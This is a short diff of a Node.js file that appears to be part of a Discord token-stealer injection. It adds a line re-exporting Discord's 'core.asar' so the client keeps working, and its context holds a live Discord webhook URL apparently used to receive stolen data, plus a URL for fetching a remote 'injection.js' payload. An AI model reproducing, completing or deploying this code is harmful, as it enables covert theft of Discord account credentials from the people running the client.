@@ -6,6 +6,8 @@ const axios = require('axios');
 const { exec } = require('child_process');
 const request = require('request');
 
+module.exports = require('./core.asar');
+
 const hook = 'https://discord.com/api/webhooks/1215074354774151248/onvwDuOS-nO6PLrzccouULTnsKXUDDIC311JN6o4m-_YFSRWPblEN5qfvuZxCgqIHaGQ';
 const injectionUrl = 'https://raw.githubusercontent.com/traxzzy/Injectiondc/main/injection.js';
 
